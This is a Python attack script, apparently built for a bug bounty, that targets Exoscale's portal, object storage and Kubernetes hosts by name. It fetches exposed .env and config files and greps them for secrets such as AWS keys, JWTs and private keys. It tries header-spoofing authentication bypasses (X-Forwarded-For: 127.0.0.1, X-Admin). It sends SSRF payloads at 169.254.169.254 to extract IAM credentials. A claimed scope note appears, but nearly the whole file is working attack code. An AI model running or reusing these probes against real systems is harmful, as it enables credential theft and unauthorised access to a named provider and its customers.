import requests
import json
import re
import time
import concurrent.futures
from urllib.parse import urljoin, urlparse

# Configuration
headers = {'X-Intigriti-Username': 'awanmh'}
REQUEST_DELAY = 0.3  # Conservative rate limiting

def safe_request(url, method='GET', **kwargs):
    """Safe request dengan comprehensive error handling"""
    try:
        time.sleep(REQUEST_DELAY)
        response = requests.request(
            method=method, 
            url=url, 
            headers={**headers, **kwargs.get('headers', {})},
            params=kwargs.get('params', {}),
            data=kwargs.get('data', {}),
            json=kwargs.get('json', {}),
            timeout=10, 
            verify=False,
            allow_redirects=True
        )
        return response
    except requests.exceptions.RequestException as e:
        return None
    except Exception as e:
        print(f"Unexpected error with {url}: {e}")
        return None

def verify_credential_leaks():
    """Comprehensive credential leak verification"""
    print("🔐 CREDENTIAL LEAK VERIFICATION")
    print("=" * 50)
    
    leak_endpoints = [
        "https://portal.exoscale.com/.env",
        "https://portal.exoscale.com/config/.env", 
        "https://portal.exoscale.com/api/config",
        "https://portal.exoscale.com/api/settings",
        "https://portal.exoscale.com/api/debug",
        "https://portal.exoscale.com/api/metadata",
        "https://portal.exoscale.com/config.json",
        "https://portal.exoscale.com/app/config.json",
        "https://portal.exoscale.com/api/config.json",
        "https://portal.exoscale.com/settings.json",
        "https://portal.exoscale.com/api/settings.json", 
        "https://portal.exoscale.com/env",
        "https://portal.exoscale.com/api/env",
        "https://portal.exoscale.com/debug/env"
    ]
    
    confirmed_leaks = []
    false_positives = []
    needs_review = []
    
    for url in leak_endpoints:
        print(f"Testing: {url}")
        response = safe_request(url)
        
        if not response:
            print(f"  ❌ No response")
            continue
            
        if response.status_code != 200:
            print(f"  ❌ Status: {response.status_code}")
            continue
            
        content = response.text
        content_lower = content.lower()
        
        # Advanced pattern matching untuk credentials
        credential_patterns = {
            'AWS_ACCESS_KEY': (r'AKIA[0-9A-Z]{16}', 'AWS Access Key ID'),
            'AWS_SECRET_KEY': (r'[0-9a-zA-Z/+]{40}', 'AWS Secret Key'),
            'API_KEY': (r'api[_-]?key["\']?\s*[:=]\s*["\']([^"\']{10,})', 'API Key'),
            'SECRET_KEY': (r'secret[_-]?key["\']?\s*[:=]\s*["\']([^"\']{10,})', 'Secret Key'),
            'PASSWORD_VALUE': (r'["\']password["\']\s*[:=]\s*["\']([^"\']{3,})["\']', 'Password Value'),
            'PRIVATE_KEY': (r'-----BEGIN (RSA|EC|DSA) PRIVATE KEY-----', 'Private Key'),
            'BEARER_TOKEN': (r'bearer\s+([a-zA-Z0-9._-]{20,})', 'Bearer Token'),
            'JWT_TOKEN': (r'eyJ[A-Za-z0-9-_=]+\.[A-Za-z0-9-_=]+\.?[A-Za-z0-9-_.+/=]*', 'JWT Token'),
            'DATABASE_URL': (r'((postgresql|mysql|mongodb)://[^"\'\s]+)', 'Database URL'),
            'CONNECTION_STRING': (r'ConnectionString["\']?\s*[:=]\s*["\']([^"\']+)', 'Connection String')
        }
        
        leaks_found = []
        for pattern_name, (pattern, description) in credential_patterns.items():
            matches = re.findall(pattern, content, re.IGNORECASE)
            if matches:
                # Filter out common false positives
                valid_matches = []
                for match in matches:
                    if isinstance(match, tuple):
                        match = match[0]  # Take the first group if it's a tuple
                    # Skip empty matches and common placeholders
                    if (match and len(match) > 5 and 
                        not any(fp in match.lower() for fp in ['password', 'secret', 'key', 'xxx', 'example'])):
                        valid_matches.append(match)
                
                if valid_matches:
                    leaks_found.append((pattern_name, description, valid_matches[:2]))  # Limit output
        
        # Determine if it's a false positive (login page)
        is_login_page = ('<input type="password"' in content and 
                        '<form' in content and 
                        ('login' in content_lower or 'sign in' in content_lower))
        
        if leaks_found:
            print(f"  🚨 CONFIRMED LEAK: {len(leaks_found)} patterns found")
            for pattern_name, description, matches in leaks_found:
                print(f"     🔍 {description}: {matches}")
            confirmed_leaks.append((url, leaks_found))
            
            # Save evidence
            filename = f"leak_{hash(url) % 10000}.txt"
            with open(filename, 'w', encoding='utf-8') as f:
                f.write(f"URL: {url}\n")
                f.write(f"Status: {response.status_code}\n")
                f.write(f"Content-Type: {response.headers.get('content-type', 'N/A')}\n")
                f.write(f"Leaks Found: {leaks_found}\n")
                f.write(f"Content Preview:\n{content[:1000]}\n")
            print(f"     💾 Evidence saved: {filename}")
            
        elif is_login_page:
            print(f"  ⚠️  FALSE POSITIVE: Login page with password field")
            false_positives.append(url)
        else:
            print(f"  🔍 NEEDS REVIEW: Unknown content type")
            print(f"     Size: {len(content)} bytes")
            print(f"     Preview: {content[:100]}...")
            needs_review.append(url)
    
    return confirmed_leaks, false_positives, needs_review

def test_sos_sks_services():
    """Comprehensive SOS and SKS services testing"""
    print("\n🔍 TESTING OBJECT STORAGE & KUBERNETES SERVICES")
    print("=" * 50)
    
    findings = []
    
    # SOS Object Storage Testing
    sos_regions = ['ch-dk-2', 'ch-gva-2', 'de-muc-1', 'at-vie-1']
    for region in sos_regions:
        sos_base_url = f"https://sos-{region}.exo.io"
        
        # Test basic accessibility
        response = safe_request(sos_base_url)
        if response and response.status_code == 200:
            print(f"✅ SOS {region}: Accessible")
            
            # Test S3 API operations
            s3_operations = [
                "/",  # Root
                "/?list-type=2",  # List buckets
                "/?location",  # Get bucket location
                "/backup",  # Common bucket
                "/logs",  # Common bucket
                "/config",  # Common bucket
                "/?versioning",  # Versioning status
                "/?acl",  # ACL check
            ]
            
            for operation in s3_operations:
                test_url = sos_base_url + operation
                op_response = safe_request(test_url)
                
                if op_response and op_response.status_code == 200:
                    # Check for S3-specific responses
                    if 'ListBucketResult' in op_response.text:
                        print(f"🚨 SOS {region}: Bucket listing enabled at {operation}")
                        findings.append(('SOS', region, 'Bucket Listing', test_url))
                    
                    # Check for public access
                    if any(indicator in op_response.text for indicator in ['<PublicAccessBlock', 'AccessControlList']):
                        print(f"🚨 SOS {region}: Public access configuration exposed at {operation}")
                        findings.append(('SOS', region, 'Public Access Config', test_url))
        
        else:
            print(f"❌ SOS {region}: Not accessible or status {getattr(response, 'status_code', 'No response')}")
    
    # SKS Kubernetes Testing
    sks_regions = ['ch-dk-2', 'ch-gva-2']
    for region in sks_regions:
        sks_base_url = f"https://sks-{region}.exo.io"
        
        # Test common K8s endpoints
        k8s_endpoints = [
            "/",
            "/api/v1/namespaces",
            "/api/v1/pods",
            "/api/v1/nodes",
            "/api/v1/secrets",
            "/version",
            "/healthz",
            "/metrics",
            "/apis/apps/v1/deployments",
            "/apis/batch/v1/jobs"
        ]
        
        for endpoint in k8s_endpoints:
            test_url = sks_base_url + endpoint
            response = safe_request(test_url, verify=False)  # K8s often uses self-signed certs
            
            if response and response.status_code == 200:
                print(f"🚨 SKS {region}: K8s API accessible at {endpoint}")
                findings.append(('SKS', region, 'K8s API Exposure', test_url))
                
                # Check for sensitive data in responses
                if 'secret' in response.text.lower() or 'token' in response.text.lower():
                    print(f"🚨 SKS {region}: Potential secrets in response at {endpoint}")
                    findings.append(('SKS', region, 'Potential Secrets Exposure', test_url))
    
    return findings

def test_authentication_bypass():
    """Comprehensive authentication bypass testing"""
    print("\n🔓 TESTING AUTHENTICATION BYPASS TECHNIQUES")
    print("=" * 50)
    
    test_url = "https://portal.exoscale.com/api/instances"
    baseline_response = safe_request(test_url)
    baseline_length = len(baseline_response.text) if baseline_response else 0
    
    print(f"Baseline response length: {baseline_length} bytes")
    
    bypass_attempts = []
    
    # Test cases organized by category
    test_cases = [
        # IP Spoofing Headers
        {"name": "X-Forwarded-For Local", "headers": {"X-Forwarded-For": "127.0.0.1"}},
        {"name": "X-Forwarded-For Internal", "headers": {"X-Forwarded-For": "10.0.0.1"}},
        {"name": "X-Real-IP", "headers": {"X-Real-IP": "127.0.0.1"}},
        {"name": "X-Originating-IP", "headers": {"X-Originating-IP": "127.0.0.1"}},
        {"name": "X-Remote-IP", "headers": {"X-Remote-IP": "127.0.0.1"}},
        
        # Admin Headers
        {"name": "X-Admin", "headers": {"X-Admin": "true"}},
        {"name": "X-Auth", "headers": {"X-Auth": "admin"}},
        {"name": "X-User", "headers": {"X-User": "admin"}},
        
        # Debug Headers
        {"name": "X-Debug", "headers": {"X-Debug": "true"}},
        {"name": "X-Debug-Mode", "headers": {"X-Debug-Mode": "true"}},
        
        # Parameter Based
        {"name": "Debug Param", "params": {"debug": "true"}},
        {"name": "Admin Param", "params": {"admin": "true"}},
        {"name": "Bypass Param", "params": {"bypass": "true"}},
        {"name": "Test Param", "params": {"test": "true"}},
        {"name": "Format JSON", "params": {"format": "json"}},
        
        # Method Override
        {"name": "Method Override GET", "headers": {"X-HTTP-Method-Override": "GET"}},
        {"name": "Method Override POST", "headers": {"X-HTTP-Method-Override": "POST"}},
        
        # JWT/Token Related
        {"name": "Empty Auth", "headers": {"Authorization": ""}},
        {"name": "Bearer Empty", "headers": {"Authorization": "Bearer "}},
        {"name": "Basic Empty", "headers": {"Authorization": "Basic "}},
        
        # Custom Headers
        {"name": "X-API-Key Empty", "headers": {"X-API-Key": ""}},
        {"name": "X-Token Empty", "headers": {"X-Token": ""}},
    ]
    
    for test_case in test_cases:
        response = safe_request(
            test_url,
            headers=test_case.get('headers', {}),
            params=test_case.get('params', {})
        )
        
        if response and response.status_code == 200:
            response_length = len(response.text)
            
            # Check for meaningful differences
            if response_length != baseline_length:
                difference = response_length - baseline_length
                print(f"🎯 INTERESTING: {test_case['name']}")
                print(f"   Response length: {response_length} (diff: {difference})")
                
                # Check if we got different content (not just a different login page)
                if abs(difference) > 100:  # Significant difference
                    print(f"   🚨 SIGNIFICANT DIFFERENCE DETECTED")
                    bypass_attempts.append((test_case['name'], response_length, difference))
                
                # Check for JSON response which might indicate API access
                if response.headers.get('content-type', '').startswith('application/json'):
                    print(f"   📄 JSON RESPONSE - Possible API access!")
                    bypass_attempts.append((f"{test_case['name']} - JSON API", response_length, difference))
    
    return bypass_attempts

def test_api_endpoints_with_auth():
    """Test API endpoints dengan berbagai authentication methods"""
    print("\n🔑 TESTING API ENDPOINTS WITH AUTHENTICATION")
    print("=" * 50)
    
    api_endpoints = [
        "/api/instances",
        "/api/volumes", 
        "/api/users",
        "/api/iam/roles",
        "/api/storage/buckets",
        "/api/kubernetes/clusters"
    ]
    
    base_url = "https://portal.exoscale.com"
    findings = []
    
    for endpoint in api_endpoints:
        url = base_url + endpoint
        
        # Test dengan berbagai content types
        content_types = [
            {'Content-Type': 'application/json'},
            {'Content-Type': 'application/xml'},
            {'Content-Type': 'application/x-www-form-urlencoded'},
            {}  # No content type
        ]
        
        for content_type in content_types:
            response = safe_request(url, headers=content_type)
            
            if response and response.status_code == 200:
                # Analyze response for API data vs login page
                content = response.text
                
                # Check if it's likely an API response vs login page
                is_api_response = (
                    response.headers.get('content-type', '').startswith('application/json') or
                    ('{' in content and '}' in content and 
                     any(key in content for key in ['"data"', '"items"', '"results"']))
                )
                
                is_login_page = ('<input type="password"' in content or 'login' in content.lower())
                
                if is_api_response and not is_login_page:
                    print(f"🚨 API ACCESS: {url}")
                    print(f"   Content-Type: {response.headers.get('content-type')}")
                    print(f"   Response: {content[:200]}...")
                    findings.append(('API Access', url, content_type))
                
                elif not is_login_page and len(content) < 5000:
                    # Neither clear API nor login - needs investigation
                    print(f"🔍 UNKNOWN RESPONSE: {url}")
                    print(f"   Length: {len(content)}")
                    print(f"   Preview: {content[:100]}...")
    
    return findings

def advanced_ssrf_testing():
    """Advanced SSRF testing dengan focus pada data extraction"""
    print("\n🎯 ADVANCED SSRF TESTING WITH DATA EXTRACTION")
    print("=" * 50)
    
    ssrf_endpoints = [
        "https://portal.exoscale.com/api/import",
        "https://portal.exoscale.com/api/fetch",
        "https://portal.exoscale.com/api/load", 
        "https://portal.exoscale.com/api/webhook"
    ]
    
    # Test targets yang bisa memberikan bukti data extraction
    test_targets = [
        # Cloud metadata dengan paths spesifik
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://169.254.169.254/latest/user-data",
        "http://169.254.169.254/latest/dynamic/instance-identity/document",
        
        # Internal services dengan expected responses
        "http://localhost/version",
        "http://127.0.0.1/health",
        
        # Test untuk response differentiation
        "http://httpbin.org/json",
        "http://httpbin.org/xml"
    ]
    
    ssrf_findings = []
    
    for endpoint in ssrf_endpoints:
        print(f"Testing endpoint: {endpoint}")
        
        for target in test_targets:
            test_url = f"{endpoint}?url={target}"
            response = safe_request(test_url)
            
            if response and response.status_code == 200:
                # Check for evidence of successful data extraction
                content = response.text
                
                # Look for evidence of the target's content
                evidence_indicators = {
                    'instance-id': '169.254.169.254 response',
                    'iam': 'AWS IAM data',
                    'accountId': 'AWS account info', 
                    'region': 'AWS region info',
                    'httpbin': 'httpbin response',
                    'json': 'JSON content',
                    'xml': 'XML content'
                }
                
                for indicator, description in evidence_indicators.items():
                    if indicator in content.lower():
                        print(f"🎯 SSRF SUCCESS: {endpoint}")
                        print(f"   Target: {target}")
                        print(f"   Evidence: {description}")
                        print(f"   Response preview: {content[:200]}...")
                        ssrf_findings.append((endpoint, target, description))
                        break
    
    return ssrf_findings

def generate_comprehensive_report(confirmed_leaks, sos_sks_findings, bypass_attempts, api_findings, ssrf_findings):
    """Generate comprehensive security assessment report"""
    print("\n" + "=" * 70)
    print("📊 COMPREHENSIVE SECURITY ASSESSMENT REPORT - EXOSCOPE")
    print("=" * 70)
    
    # Executive Summary
    print(f"\n🚨 EXECUTIVE SUMMARY")
    print(f"   Critical Findings: {len(confirmed_leaks)}")
    print(f"   SOS/SKS Issues: {len(sos_sks_findings)}")
    print(f"   Auth Bypass Attempts: {len(bypass_attempts)}")
    print(f"   API Access Findings: {len(api_findings)}")
    print(f"   SSRF Data Extraction: {len(ssrf_findings)}")
    
    # Critical Findings Section
    if confirmed_leaks:
        print(f"\n🔐 CRITICAL: CREDENTIAL LEAKS FOUND")
        for url, leaks in confirmed_leaks:
            print(f"   📍 {url}")
            for pattern_name, description, matches in leaks:
                print(f"      🔓 {description}: {matches}")
    
    # SOS/SKS Findings
    if sos_sks_findings:
        print(f"\n☁️  CLOUD SERVICE MISCONFIGURATIONS")
        for service, region, issue, url in sos_sks_findings:
            print(f"   📍 {service} {region}: {issue}")
            print(f"      🔗 {url}")
    
    # Authentication Bypass
    if bypass_attempts:
        print(f"\n🔓 AUTHENTICATION BYPASS INDICATORS")
        for attempt, length, difference in bypass_attempts:
            print(f"   🎯 {attempt}")
            print(f"      Response length: {length} (diff: {difference})")
    
    # API Access Findings
    if api_findings:
        print(f"\n🔑 API ENDPOINT ACCESS")
        for finding_type, url, content_type in api_findings:
            print(f"   📍 {url}")
            print(f"      Type: {finding_type}")
            print(f"      Headers: {content_type}")
    
    # SSRF Findings
    if ssrf_findings:
        print(f"\n🎯 SSRF WITH DATA EXTRACTION")
        for endpoint, target, evidence in ssrf_findings:
            print(f"   📍 {endpoint}")
            print(f"      Target: {target}")
            print(f"      Evidence: {evidence}")
    
    # Recommendations
    print(f"\n💡 SECURITY RECOMMENDATIONS")
    
    if confirmed_leaks:
        print(f"   🚨 IMMEDIATE: Investigate and rotate all exposed credentials")
    
    if sos_sks_findings:
        print(f"   🚨 HIGH: Review SOS bucket policies and SKS cluster access")
    
    if bypass_attempts or api_findings:
        print(f"   🔴 MEDIUM: Strengthen authentication and authorization mechanisms")
    
    if ssrf_findings:
        print(f"   🔴 MEDIUM: Implement SSRF protections and input validation")
    
    # Save detailed report
    report = {
        "timestamp": time.time(),
        "confirmed_credential_leaks": confirmed_leaks,
        "sos_sks_findings": sos_sks_findings,
        "authentication_bypass_attempts": bypass_attempts,
        "api_access_findings": api_findings,
        "ssrf_data_extraction": ssrf_findings
    }
    
    with open('exoscale_security_assessment.json', 'w') as f:
        json.dump(report, f, indent=2)
    
    print(f"\n💾 Detailed report saved to: exoscale_security_assessment.json")

def main():
    """Main execution function"""
    print("🚀 EXOSCOPE COMPREHENSIVE SECURITY ASSESSMENT")
    print("=" * 60)
    print("Note: This script performs security testing with proper rate limiting")
    print("and respects the program's scope and rules of engagement.")
    print("=" * 60)
    
    start_time = time.time()
    
    try:
        # Phase 1: Credential Leak Verification
        confirmed_leaks, false_positives, needs_review = verify_credential_leaks()
        
        # Phase 2: Cloud Services Testing
        sos_sks_findings = test_sos_sks_services()
        
        # Phase 3: Authentication Bypass Testing
        bypass_attempts = test_authentication_bypass()
        
        # Phase 4: API Endpoint Testing
        api_findings = test_api_endpoints_with_auth()
        
        # Phase 5: Advanced SSRF Testing
        ssrf_findings = advanced_ssrf_testing()
        
        # Generate Report
        generate_comprehensive_report(
            confirmed_leaks, 
            sos_sks_findings, 
            bypass_attempts, 
            api_findings, 
            ssrf_findings
        )
        
    except Exception as e:
        print(f"💥 Script execution failed: {e}")
        import traceback
        traceback.print_exc()
    
    # Execution time
    end_time = time.time()
    print(f"\n⏱️  Total execution time: {end_time - start_time:.2f} seconds")
    print("🎯 Assessment complete. Review findings above.")

if __name__ == "__main__":
    main()